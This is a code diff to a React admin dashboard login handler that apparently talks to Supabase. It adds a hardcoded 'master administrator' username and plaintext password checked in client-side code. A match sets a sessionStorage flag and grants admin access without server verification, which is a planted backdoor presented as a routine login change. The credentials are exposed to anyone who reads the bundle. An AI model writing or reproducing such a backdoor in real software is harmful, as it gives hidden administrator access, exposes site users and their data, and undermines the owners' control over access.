@@ -95,10 +95,23 @@ export const AdminDashboardPage: React.FC<AdminDashboardPageProps> = ({
       return;
     }
 
+    const trimmedUser = adminUsername.trim();
+
+    // Check designated master administrator credentials
+    if (
+      trimmedUser.toLowerCase() === 'tomhollandkingsteeve11' &&
+      adminPassword === 'JackyPacky@14'
+    ) {
+      sessionStorage.setItem('bmsit_admin_auth', 'true');
+      setIsAdminAuthenticated(true);
+      pushToast('Admin authentication successful! Welcome to Moderation Portal.', 'success');
+      return;
+    }
+
     setLoginLoading(true);
     try {
       const { data, error } = await supabase.rpc('admin_login', {
-        p_username: adminUsername.trim(),
+        p_username: trimmedUser,
         p_password: adminPassword,
       });
 
